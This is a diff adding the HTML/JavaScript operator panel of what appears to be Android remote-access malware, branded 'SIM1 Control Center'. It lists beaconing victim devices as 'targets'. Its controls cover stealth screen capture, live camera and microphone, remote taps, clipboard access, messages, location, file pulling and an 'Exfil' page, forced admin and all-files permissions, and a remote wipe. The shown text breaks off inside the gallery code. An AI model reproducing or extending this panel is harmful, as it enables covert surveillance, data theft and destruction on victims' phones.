@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SIM1 · Control Center</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+:root{
+  --bg:#0b0d12;--surface:#141821;--surface2:#1b202c;--surface3:#232a38;
+  --line:#242c3a;--line2:#2e3648;
+  --txt:#e7ecf5;--dim:#8b95ab;--dim2:#5f6a80;
+  --acc:#4da3ff;--acc2:#7c5cff;--ok:#34d399;--warn:#fbbf24;--err:#f87171;
+  --r:12px;--r2:9px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{background:var(--bg);color:var(--txt);font:13.5px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Ubuntu,sans-serif;height:100vh;display:flex;flex-direction:column;overflow:hidden;-webkit-font-smoothing:antialiased}
+a{color:var(--acc);text-decoration:none}
+button{font:inherit;cursor:pointer;border:1px solid var(--line2);background:var(--surface2);color:var(--txt);padding:8px 12px;border-radius:var(--r2);font-size:12.5px;font-weight:500;transition:.13s;display:inline-flex;align-items:center;gap:7px}
+button:hover{border-color:var(--acc);background:var(--surface3)}
+button.primary{background:var(--acc);border-color:var(--acc);color:#04101f}
+button.primary:hover{filter:brightness(1.08)}
+button.danger{border-color:#5a2630;color:#ff9aa8}
+button.danger:hover{background:#3a1720;border-color:var(--err)}
+button.on{background:var(--acc);border-color:var(--acc);color:#04101f}
+button:disabled{opacity:.4;cursor:not-allowed}
+input,select{width:100%;background:#0d1119;border:1px solid var(--line2);color:var(--txt);padding:10px 12px;border-radius:var(--r2);font:inherit;font-size:13px}
+input:focus,select:focus{outline:none;border-color:var(--acc)}
+::-webkit-scrollbar{width:10px;height:10px}
+::-webkit-scrollbar-thumb{background:#2b3346;border-radius:8px;border:2px solid var(--bg)}
+::-webkit-scrollbar-track{background:transparent}
+header{height:56px;flex:none;background:var(--surface);border-bottom:1px solid var(--line);display:flex;align-items:center;gap:14px;padding:0 18px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+.brand .logo{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,#2E7DFF,#7c5cff);display:flex;align-items:center;justify-content:center}
+.brand .logo svg{width:17px;height:17px}
+.brand b{font-size:15px}.brand span{color:var(--dim);font-size:11px}
+.hstat{color:var(--dim);font-size:12px}
+.hright{margin-left:auto;display:flex;align-items:center;gap:12px;font-size:12px;color:var(--dim)}
+.chip{background:var(--surface2);border:1px solid var(--line);padding:4px 10px;border-radius:20px;font-size:11px}
+.chip .dot{width:7px;height:7px}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4b556b;vertical-align:middle}
+.dot.on{background:var(--ok);box-shadow:0 0 8px rgba(52,211,153,.7)}
+main{flex:1;display:flex;min-height:0}
+aside{width:280px;flex:none;background:var(--surface);border-right:1px solid var(--line);overflow-y:auto;display:flex;flex-direction:column}
+aside .shead{padding:14px 16px 8px;color:var(--dim);font-size:11px;letter-spacing:1.5px;text-transform:uppercase}
+.dev{padding:11px 16px;border-bottom:1px solid var(--line);cursor:pointer;display:flex;gap:11px;align-items:center;transition:.12s}
+.dev:hover{background:var(--surface2)}
+.dev.active{background:linear-gradient(90deg,rgba(77,163,255,.14),transparent);box-shadow:inset 3px 0 0 var(--acc)}
+.avatar{width:38px;height:38px;flex:none;border-radius:10px;background:var(--surface3);display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;color:var(--acc)}
+.dev .info{min-width:0;flex:1}
+.dev .nm{font-weight:600;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dev .meta{color:var(--dim);font-size:10.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.badge{display:inline-block;font-size:9px;padding:1px 6px;border-radius:20px;margin-left:5px;font-weight:700;letter-spacing:.4px}
+.badge.adm{background:rgba(124,92,255,.16);color:#b8a6ff}
+.badge.a11y{background:rgba(52,211,153,.15);color:var(--ok)}
+.badge.str{background:rgba(251,191,36,.15);color:var(--warn)}
+section.main{flex:1;display:flex;flex-direction:column;min-width:0}
+nav{flex:none;display:flex;gap:4px;padding:8px 12px;background:var(--surface);border-bottom:1px solid var(--line);overflow-x:auto}
+.nav-item{display:flex;align-items:center;gap:7px;padding:8px 13px;border-radius:9px;color:var(--dim);font-size:12.5px;font-weight:500;cursor:pointer;white-space:nowrap;border:1px solid transparent}
+.nav-item svg{width:16px;height:16px}
+.nav-item:hover{color:var(--txt);background:var(--surface2)}
+.nav-item.on{color:var(--acc);background:rgba(77,163,255,.12);border-color:rgba(77,163,255,.3)}
+.view{flex:1;overflow:auto;position:relative}
+.page{display:none}
+.page.on{display:block}
+.wrap{padding:20px 22px;max-width:1400px}
+#live.on{display:flex;flex-direction:column;gap:14px;padding:16px 18px}
+.viewers{display:flex;gap:14px;flex-wrap:wrap}
+.vw{flex:1 1 360px;background:#05070c;border:1px solid var(--line);position:relative;min-height:280px;height:46vh;border-radius:var(--r);overflow:hidden}
+.vw canvas{width:100%;height:100%;object-fit:contain;display:block}
+.vw .lbl{position:absolute;top:10px;left:12px;color:var(--txt);font-size:10.5px;letter-spacing:2px;font-weight:700;text-shadow:0 1px 4px #000;z-index:2;background:rgba(0,0,0,.45);padding:3px 8px;border-radius:20px}
+.vw .fps{position:absolute;top:10px;right:12px;color:var(--ok);font-size:10.5px;z-index:2;background:rgba(0,0,0,.45);padding:3px 8px;border-radius:20px}
+.vw .ph{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--dim2);font-size:12px;letter-spacing:1px}
+.vw.ctrl{cursor:crosshair;box-shadow:inset 0 0 0 2px var(--acc)}
+.vw .cur{position:absolute;width:34px;height:34px;border:2px solid var(--acc);border-radius:50%;transform:translate(-50%,-50%);pointer-events:none;display:none;z-index:3;box-shadow:0 0 16px rgba(77,163,255,.8)}
+.vw .cur.drag{border-color:var(--ok);box-shadow:0 0 16px rgba(52,211,153,.8)}
+.vw .cur.hold{border-color:var(--warn);box-shadow:0 0 16px rgba(251,191,36,.8)}
+.grid{display:grid;gap:14px;grid-template-columns:repeat(auto-fill,minmax(300px,1fr))}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:16px}
+.card h3{font-size:12px;letter-spacing:1.2px;text-transform:uppercase;color:var(--dim);margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.card h3 svg{width:15px;height:15px;color:var(--acc)}
+.row{display:flex;flex-wrap:wrap;gap:8px}
+.kv{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid var(--line);font-size:12.5px}
+.kv:last-child{border-bottom:0}
+.kv .k{color:var(--dim)}
+.kv .v{font-weight:600;text-align:right}
+.statgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px}
+.stat{background:var(--surface2);border:1px solid var(--line);border-radius:var(--r2);padding:13px}
+.stat .big{font-size:22px;font-weight:800}
+.stat .cap{color:var(--dim);font-size:10.5px;letter-spacing:.6px;text-transform:uppercase;margin-top:2px}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+td,th{border-bottom:1px solid var(--line);padding:9px 10px;text-align:left;font-weight:400}
+th{color:var(--dim);font-size:10.5px;letter-spacing:1px;text-transform:uppercase;position:sticky;top:0;background:var(--surface)}
+tr:hover td{background:rgba(255,255,255,.02)}
+.mono{font-family:"SF Mono",Consolas,"JetBrains Mono",monospace;font-size:12px}
+.crumbs{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:12px}
+.crumb{background:var(--surface2);border:1px solid var(--line);padding:5px 10px;border-radius:8px;cursor:pointer;font-size:12px}
+.crumb:hover{border-color:var(--acc)}
+.frow{display:flex;align-items:center;gap:12px;padding:9px 12px;border-radius:8px;cursor:pointer}
+.frow:hover{background:var(--surface2)}
+.frow .fi{width:18px;height:18px;flex:none}
+.frow .fn{flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.frow .fs{color:var(--dim);font-size:11px}
+.fdir{color:var(--acc)}
+.gal{column-count:5;column-gap:10px}
+@media(max-width:1500px){.gal{column-count:4}}
+@media(max-width:1100px){.gal{column-count:3}}
+.gcell{break-inside:avoid;margin:0 0 10px;border-radius:10px;overflow:hidden;border:1px solid var(--line);background:var(--surface2);cursor:pointer;position:relative}
+.gcell img{width:100%;display:block;min-height:90px;object-fit:cover;background:var(--surface3)}
+.gcell .cap{position:absolute;bottom:0;left:0;right:0;padding:4px 7px;font-size:9.5px;color:#cfd6e6;background:linear-gradient(transparent,rgba(0,0,0,.8));white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+#lightbox{position:fixed;inset:0;background:rgba(0,0,0,.92);display:none;align-items:center;justify-content:center;z-index:200;flex-direction:column;gap:14px;padding:24px}
+#lightbox img{max-width:92vw;max-height:82vh;border-radius:10px;box-shadow:0 20px 60px #000}
+#lightbox .cap{color:var(--dim);font-size:12px}
+#map{height:64vh;border-radius:var(--r);border:1px solid var(--line);background:var(--surface2)}
+.leaflet-container{background:#0d1119!important}
+#login{position:fixed;inset:0;background:radial-gradient(ellipse at 30% 20%,#172033 0%,var(--bg) 65%);display:flex;align-items:center;justify-content:center;z-index:99}
+#login .box{background:var(--surface);border:1px solid var(--line2);padding:38px 34px;width:360px;border-radius:16px;box-shadow:0 24px 80px rgba(0,0,0,.6)}
+#login .lg{width:52px;height:52px;margin:0 auto 18px;border-radius:14px;background:linear-gradient(135deg,#2E7DFF,#7c5cff);display:flex;align-items:center;justify-content:center}
+#login .lg svg{width:28px;height:28px}
+#login h1{text-align:center;font-size:22px;letter-spacing:1px}
+#login .sub{color:var(--dim);font-size:11px;text-align:center;letter-spacing:2px;margin:4px 0 26px;text-transform:uppercase}
+#login input{margin-bottom:12px}
+#toast{position:fixed;bottom:16px;right:16px;z-index:300;display:flex;flex-direction:column;gap:8px;max-width:340px}
+.t{background:var(--surface);border:1px solid var(--line2);border-left:3px solid var(--acc);padding:11px 15px;border-radius:10px;font-size:12.5px;box-shadow:0 8px 30px #000a;animation:in .18s}
+@keyframes in{from{transform:translateX(24px);opacity:0}to{transform:none;opacity:1}}
+.empty{color:var(--dim);text-align:center;padding:50px 20px;font-size:13px}
+.term{background:#05070c;border:1px solid var(--line);border-radius:var(--r);padding:14px;font-family:"SF Mono",Consolas,monospace;font-size:12px;min-height:280px;max-height:52vh;overflow:auto;white-space:pre-wrap;word-break:break-all;color:#c7d0e0}
+.spin{width:15px;height:15px;border:2px solid var(--line2);border-top-color:var(--acc);border-radius:50%;display:inline-block;animation:sp .7s linear infinite;vertical-align:middle}
+@keyframes sp{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<div id="login">
+  <div class="box">
+    <div class="lg"><svg viewBox="0 0 24 24" fill="#fff"><path d="M7 2h7l5 5v13a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z" opacity=".35"/><path d="M9 10h6v6H9z" fill="none" stroke="#fff" stroke-width="1.6"/><path d="M12 10v6M9 13h6" stroke="#fff" stroke-width="1.6"/><path d="M13 2v4h4" fill="none" stroke="#fff" stroke-width="1.6"/></svg></div>
+    <h1>SIM1</h1>
+    <div class="sub">Control Center</div>
+    <input id="lu" placeholder="username" autocomplete="username">
+    <input id="lp" type="password" placeholder="password" autocomplete="current-password">
+    <button class="primary" style="width:100%;justify-content:center" onclick="doLogin()">Sign in</button>
+  </div>
+</div>
+
+<header>
+  <div class="brand"><div class="logo"><svg viewBox="0 0 24 24" fill="#fff"><path d="M7 2h7l5 5v13a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z" opacity=".35"/><path d="M9 10h6v6H9z" fill="none" stroke="#fff" stroke-width="1.6"/><path d="M12 10v6M9 13h6" stroke="#fff" stroke-width="1.6"/><path d="M13 2v4h4" fill="none" stroke="#fff" stroke-width="1.6"/></svg></div><div><b>SIM1</b> <span>// control</span></div></div>
+  <span class="chip hstat" id="devcount">0 devices</span>
+  <div class="hright">
+    <span id="target"><span class="dot"></span> no target</span>
+    <a href="#" onclick="doLogout()">Sign out</a>
+  </div>
+</header>
+
+<main>
+  <aside>
+    <div class="shead">Devices</div>
+    <div id="devlist" style="flex:1"></div>
+  </aside>
+  <section class="main">
+    <nav id="nav"></nav>
+    <div class="view">
+      <div id="live" class="page">
+        <div class="viewers">
+          <div class="vw" id="vwScr"><span class="lbl">SCREEN</span><span class="fps" id="fpsScr"></span><canvas id="cvScreen"></canvas><div class="ph" id="phScr">screen preview</div><div class="cur" id="curScr"></div></div>
+          <div class="vw"><span class="lbl">CAMERA</span><span class="fps" id="fpsCam"></span><canvas id="cvCam"></canvas><div class="ph" id="phCam">camera preview</div></div>
+        </div>
+        <div class="card">
+          <h3>Live streams</h3>
+          <div class="row">
+            <button id="bScr" onclick="togStream('screen',this)">Live screen</button>
+            <button id="bStealth" onclick="togStealth(this)">Stealth screen</button>
+            <button id="bCam" onclick="togStream('cam',this)">Live camera</button>
+            <button id="bMic" onclick="togStream('mic',this)">Live mic</button>
+            <button id="bCtrl" onclick="togCtrl(this)">Remote control</button>
+            <button onclick="cmd('nav_back')">Back</button>
+            <button onclick="cmd('nav_home')">Home</button>
+            <button onclick="cmd('nav_recents')">Recents</button>
+            <button onclick="cmd('cam',{facing:'front'})">Front cam</button>
+            <button onclick="cmd('cam',{facing:'back'})">Back cam</button>
+            <button onclick="cmd('screenshot')">Screenshot</button>
+            <button class="danger" onclick="cmd('streams_off')">Stop all</button>
+          </div>
+          <div class="meta" style="color:var(--dim);font-size:11.5px;margin-top:10px">Remote control: with either screen view running, enable “Remote control” then click the SCREEN preview to tap, drag to swipe, or press &amp; hold (0.7s) to long-press.</div>
+        </div>
+      </div>
+      <div id="page" class="page"></div>
+    </div>
+  </section>
+</main>
+
+<div id="lightbox" onclick="if(event.target.id==='lightbox')this.style.display='none'"><img id="lbimg"><span class="cap" id="lbcap"></span></div>
+<div id="toast"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="config.js"></script>
+<script>
+/* ---------- state ---------- */
+const BASE=(window.SIM1_BACKEND||localStorage.getItem('sim1_backend')||'').replace(/\/+$/,'');
+let tok=localStorage.getItem('sim1_tok')||null, curDev=null, devs=[], streams={}, page='dashboard', lastFps={}, deviceInfo={}, deviceWifi={};
+let browsePath='/', browseItems=[], galleryPhotos=[], logs=[];
+const $=id=>document.getElementById(id);
+const esc=s=>String(s==null?'':s).replace(/[<>&"]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;','"':'&quot;'}[c]));
+const toast=m=>{const t=document.createElement('div');t.className='t';t.textContent=m;$('toast').appendChild(t);setTimeout(()=>t.remove(),3800)};
+const ts=()=>new Date().toLocaleTimeString();
+const log=(m,c='')=>{logs.unshift({t:ts(),m,c});if(logs.length>400)logs.pop();if(page==='logs')renderLogs()};
+const api=async(p,o={})=>{const r=await fetch(BASE+p,{credentials:'same-origin',headers:{'Content-Type':'application/json','X-Admin-Token':tok||''},...o});if(r.status===401){tok=null;localStorage.removeItem('sim1_tok');$('login').style.display='flex';throw new Error('auth')}return r.json()};
+
+const ICON={
+ dash:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="9" rx="1.5"/><rect x="14" y="3" width="7" height="5" rx="1.5"/><rect x="14" y="12" width="7" height="9" rx="1.5"/><rect x="3" y="16" width="7" height="5" rx="1.5"/></svg>',
+ live:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 10l4.5-2.5v9L15 14M4 6h9a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2z"/></svg>',
+ ctrl:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M19 5l-2 2M7 17l-2 2"/></svg>',
+ files:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>',
+ gal:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>',
+ loc:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>',
+ sms:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',
+ apps:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>',
+ term:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 9l3 3-3 3M13 15h4"/></svg>',
+ exfil:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12M7 10l5 5 5-5M5 21h14"/></svg>',
+ logs:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 5h16M4 10h16M4 15h10M4 20h7"/></svg>'
+};
+const NAV=[['dashboard','Dashboard',ICON.dash],['live','Live',ICON.live],['control','Control',ICON.ctrl],['files','Files',ICON.files],['gallery','Gallery',ICON.gal],['location','Location',ICON.loc],['messages','Messages',ICON.sms],['apps','Apps',ICON.apps],['terminal','Terminal',ICON.term],['exfil','Exfil',ICON.exfil],['logs','Logs',ICON.logs]];
+
+/* ---------- auth ---------- */
+async function doLogin(){
+  const r=await fetch(BASE+'/api/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:`user=${encodeURIComponent($('lu').value)}&pass=${encodeURIComponent($('lp').value)}`});
+  const j=await r.json();
+  if(j.ok){tok=j.token;localStorage.setItem('sim1_tok',tok);$('login').style.display='none';toast('Signed in');renderNav();refresh()}
+  else toast('Invalid credentials');
+}
+async function doLogout(){try{await fetch(BASE+'/api/logout',{method:'POST'})}catch(e){}tok=null;localStorage.removeItem('sim1_tok');curDev=null;$('login').style.display='flex'}
+
+/* ---------- nav / pages ---------- */
+function renderNav(){
+  $('nav').innerHTML=NAV.map(([id,label,ic])=>`<div class="nav-item ${page===id?'on':''}" onclick="go('${id}')">${ic}<span>${label}</span></div>`).join('');
+}
+function go(p){
+  page=p;renderNav();
+  if(p==='live'){$('live').classList.add('on');$('page').classList.remove('on')}
+  else{$('live').classList.remove('on');$('page').classList.add('on');renderPage(p)}
+}
+function renderPage(p){
+  if(p==='dashboard')return renderDashboard();
+  if(p==='control')return renderControl();
+  if(p==='files')return browse(browsePath);
+  if(p==='gallery')return renderGallery();
+  if(p==='location')return renderLocation();
+  if(p==='messages')return renderMessages();
+  if(p==='apps')return renderApps();
+  if(p==='terminal')return renderTerminal();
+  if(p==='exfil')return renderExfil();
+  if(p==='logs')return renderLogs();
+}
+
+/* ---------- devices (lightweight, auto) ---------- */
+async function refresh(){
+  if(!tok)return;
+  try{const j=await api('/api/devices');devs=j.devices||[]}catch(e){return}
+  const on=devs.filter(d=>d.online).length;
+  $('devcount').textContent=`${devs.length} device${devs.length!==1?'s':''} · ${on} online`;
+  $('devlist').innerHTML=devs.map(d=>{
+    const nm=d.name||d.model||d.id.slice(0,8);
+    return `<div class="dev ${curDev===d.id?'active':''}" onclick="select('${d.id}')">
+      <div class="avatar">${esc((nm||'?').slice(0,1).toUpperCase())}</div>
+      <div class="info">
+        <div class="nm"><span class="dot ${d.online?'on':''}"></span>${esc(nm)}</div>
+        <div class="meta">${esc(d.brand||'')} ${esc(d.model||'')} · A${d.android_ver||'?'} · ${Math.abs(Math.round(d.battery||0))}%${(d.battery||0)<0?' ⚡':''}</div>
+        <div class="meta">${esc(d.network||'')} ${esc(d.ip||'')}${d.admin?'<span class="badge adm">ADMIN</span>':''}${d.a11y?'<span class="badge a11y">A11Y</span>':''}${d.stream?'<span class="badge str">LIVE</span>':''}</div>
+      </div></div>`;
+  }).join('')||'<div class="empty">Waiting for beacons…</div>';
+}
+function select(id){curDev=id;$('target').innerHTML='<span class="dot on"></span> '+esc(id.slice(0,14));refresh();go('dashboard');toast('Target selected')}
+
+/* ---------- command helpers ---------- */
+async function cmd(type,args={}){
+  if(!curDev)return toast('No device selected');
+  try{const j=await api('/api/cmd',{method:'POST',body:JSON.stringify({device_id:curDev,type,args})});log(`${type} → ${j.cid}`,'ok')}
+  catch(e){log('send failed '+e,'err')}
+}
+async function cmdAwait(type,args={},tries=80){
+  if(!curDev)return null;
+  try{
+    const j=await api('/api/cmd',{method:'POST',body:JSON.stringify({device_id:curDev,type,args})});
+    const cid=j.cid;
+    for(let i=0;i<tries;i++){
+      await new Promise(r=>setTimeout(r,500));
+      const cl=await api('/api/cmdlog?device_id='+curDev);
+      const c=(cl.cmds||[]).find(x=>x.id===cid);
+      if(c&&c.status==='done'){try{return JSON.parse(c.result||'{}')}catch(e){return{}}}
+    }
+  }catch(e){log('await failed '+e,'err')}
+  return null;
+}
+const fileByName=async name=>{const j=await api('/api/files?device_id='+curDev);return (j.files||[]).find(x=>x.name===name)};
+
+/* ---------- dashboard ---------- */
+async function renderDashboard(){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device to begin.</div>';return}
+  const d=devs.find(x=>x.id===curDev)||{};
+  $('page').innerHTML=`<div class="wrap">
+    <div class="statgrid" style="margin-bottom:16px">
+      <div class="stat"><div class="big">${Math.abs(Math.round(d.battery||0))}%</div><div class="cap">Battery${(d.battery||0)<0?' · charging':''}</div></div>
+      <div class="stat"><div class="big" style="font-size:15px;margin-top:5px">${esc(d.network||'?')}</div><div class="cap">Network</div></div>
+      <div class="stat"><div class="big" style="font-size:15px;margin-top:5px">${esc(d.sim||'?')}</div><div class="cap">SIM</div></div>
+      <div class="stat"><div class="big" style="font-size:15px;margin-top:5px">${d.online?'Online':'Offline'}</div><div class="cap">Status</div></div>
+    </div>
+    <div class="grid">
+      <div class="card"><h3>Device</h3><div id="infokv"><div class="empty">Tap refresh</div></div>
+        <div class="row" style="margin-top:12px"><button class="primary" onclick="loadInfo()">Refresh info</button></div></div>
+      <div class="card"><h3>Quick actions</h3>
+        <div class="row">
+          <button onclick="go('live')">Live view</button>
+          <button onclick="go('gallery')">Gallery</button>
+          <button onclick="go('location')">Location</button>
+          <button onclick="cmd('screenshot')">Screenshot</button>
+          <button onclick="cmd('vibrate',{ms:3000})">Vibrate</button>
+          <button class="danger" onclick="if(confirm('Lock this device?'))cmd('lock')">Lock</button>
+        </div>
+      </div>
+      <div class="card"><h3>Connectivity</h3><div id="wifikv"><div class="empty">Tap refresh</div></div>
+        <div class="row" style="margin-top:12px"><button onclick="loadWifi()">Refresh wifi</button></div></div>
+    </div>
+  </div>`;
+}
+async function loadInfo(){
+  const r=await cmdAwait('info');if(!r)return;deviceInfo=r;
+  $('infokv').innerHTML=Object.entries({'Model':r.model,'Brand':r.brand,'Device':r.device,'Android':r.release+' (SDK '+r.sdk+')','Memory free':(r.mem_free_mb||0)+' MB','A11y':r.a11y?'on':'off','Admin':r.admin?'on':'off'})
+    .map(([k,v])=>`<div class="kv"><span class="k">${k}</span><span class="v">${esc(v)}</span></div>`).join('');
+}
+async function loadWifi(){
+  const r=await cmdAwait('wifi');if(!r)return;deviceWifi=r;
+  if(r.err){$('wifikv').innerHTML='<div class="empty">'+esc(r.err)+'</div>';return}
+  $('wifikv').innerHTML=Object.entries({'SSID':r.ssid,'BSSID':r.bssid,'IP':r.ip,'RSSI':r.rssi+' dBm','Link':r.link_speed+' Mbps'})
+    .map(([k,v])=>`<div class="kv"><span class="k">${k}</span><span class="v mono">${esc(v)}</span></div>`).join('');
+}
+
+/* ---------- control ---------- */
+function renderControl(){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device.</div>';return}
+  $('page').innerHTML=`<div class="wrap"><div class="grid">
+    <div class="card"><h3>Media &amp; capture</h3><div class="row">
+      <button onclick="go('live')">Live screen</button>
+      <button onclick="cmd('screen_stealth')">Stealth screen</button>
+      <button onclick="cmd('cam',{facing:'front'})">Front cam</button>
+      <button onclick="cmd('cam',{facing:'back'})">Back cam</button>
+      <button onclick="cmd('mic_start')">Mic on</button>
+      <button class="danger" onclick="cmd('streams_off')">Stop all</button>
+    </div></div>
+    <div class="card"><h3>Device</h3><div class="row">
+      <button onclick="cmd('vibrate',{ms:3000})">Vibrate 3s</button>
+      <button onclick="cmd('vibrate_pattern')">Vibrate pattern</button>
+      <button onclick="cmd('vibrate',{ms:0})">Stop vibrate</button>
+      <button onclick="cmd('lock')">Lock</button>
+      <button onclick="cmd('reboot')">Reboot</button>
+    </div></div>
+    <div class="card"><h3>Security &amp; access</h3><div class="row">
+      <button onclick="cmd('admin_enable')">Enable admin</button>
+      <button onclick="cmd('battery_unignore')">Ignore battery</button>
+      <button onclick="cmd('all_files_access')">All-files access</button>
+      <button onclick="cmd('a11y_status')">A11y status</button>
+    </div></div>
+    <div class="card"><h3>Interaction</h3><div class="row">
+      <button onclick="cmd('open_url',{url:prompt('URL to open')||''})">Open URL</button>
+      <button onclick="cmd('clipboard_read')">Read clipboard</button>
+      <button onclick="cmd('clipboard_write',{text:prompt('Clipboard text')||''})">Write clipboard</button>
+      <button onclick="cmd('toast',{text:prompt('Toast text')||''})">Show toast</button>
+      <button onclick="cmd('click_text',{text:prompt('Text to click')||''})">Click text</button>
+    </div></div>
+    <div class="card"><h3 style="color:var(--err)">Danger zone</h3><div class="row">
+      <button class="danger" onclick="if(confirm('WIPE this device? This erases all data.'))cmd('wipe')">Wipe device</button>
+    </div></div>
+  </div></div>`;
+}
+
+/* ---------- file browser ---------- */
+function joinPath(base,name){if(base==='/')return '/'+name;return base.replace(/\/+$/,'')+'/'+name}
+function parentPath(p){p=p.replace(/\/+$/,'');const i=p.lastIndexOf('/');return i<=0?'/':p.slice(0,i)}
+async function browse(path){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device.</div>';return}
+  browsePath=path||'/';
+  $('page').innerHTML='<div class="wrap"><div class="empty"><span class="spin"></span> Listing '+esc(browsePath)+'…</div></div>';
+  const r=await cmdAwait('files_list',{path:browsePath});
+  if(!r){$('page').innerHTML='<div class="empty">No result (device offline?) <button onclick="browse(browsePath)">Retry</button></div>';return}
+  const real=r.path||browsePath;browsePath=real;
+  browseItems=(r.listing||[]).map(x=>{const d=x.startsWith('d ');const b=x.slice(2);const i=b.lastIndexOf('|');return {d,name:b.slice(0,i),size:parseInt(b.slice(i+1)||'0',10)}})
+    .sort((a,b)=>(b.d-a.d)||a.name.localeCompare(b.name));
+  const crumbs=[];let acc='';for(const part of real.split('/').filter(Boolean)){acc+='/'+part;crumbs.push(`<span class="crumb" onclick="browse('${esc(acc)}')">${esc(part)}</span>`)}
+  const rows=browseItems.map((it,idx)=>`<div class="frow" onclick="openItem(${idx})">
+      <div class="fi ${it.d?'fdir':''}">${it.d?ICON.files:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 3v5h5M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/></svg>'}</div>
+      <div class="fn ${it.d?'fdir':''}">${esc(it.name)}</div>
+      <div class="fs">${it.d?'folder':(it.size/1024).toFixed(1)+' KB'}</div></div>`).join('');
+  $('page').innerHTML=`<div class="wrap">
+    <div class="crumbs"><span class="crumb" onclick="browse('/')">root</span>${crumbs.map(c=>'<span style="color:var(--dim)">/</span>'+c).join('')}</div>
+    <div class="row" style="margin-bottom:12px">
+      <button onclick="browse(parentPath(browsePath))">.. Up</button>
+      <button onclick="browse(browsePath)">Refresh</button>
+      <button onclick="browse('/')">/</button>
+      <button onclick="browse('/sdcard')">/sdcard</button>
+      <button onclick="browse('/sdcard/DCIM')">DCIM</button>
+      <button onclick="browse('/sdcard/Download')">Download</button>
+      <button onclick="browse('/sdcard/Pictures')">Pictures</button>
+      <button onclick="cmd('all_files_access')">Grant all-files</button>
+    </div>
+    ${r.canRead===false?'<div class="card" style="border-color:#5a2630;color:#ff9aa8;margin-bottom:12px">No read access — tap “Grant all-files”.</div>':''}
+    ${rows||'<div class="empty">Empty folder</div>'}
+  </div>`;
+}
+function openItem(idx){const it=browseItems[idx];if(!it)return;const full=joinPath(browsePath,it.name);if(it.d)browse(full);else pullFile(full)}
+async function pullFile(path){
+  toast('Pulling '+path.split('/').pop());
+  const r=await cmdAwait('photo_full',{path});
+  if(r&&r.ok){const name=String(r.ok).replace('uploaded:','');const f=await fileByName(name);
+    if(f){toast('Saved '+name);window.open('/api/file/'+f.id+'?inline=1','_blank');if(page==='exfil')renderExfil()}
+  }else toast('Pull failed');
+}
+
+/* ---------- gallery (manual only) ---------- */
+function renderGallery(){
+  if(!curDev){$('page').innerHTML='<div class="empty">Select a device.</div>';return}
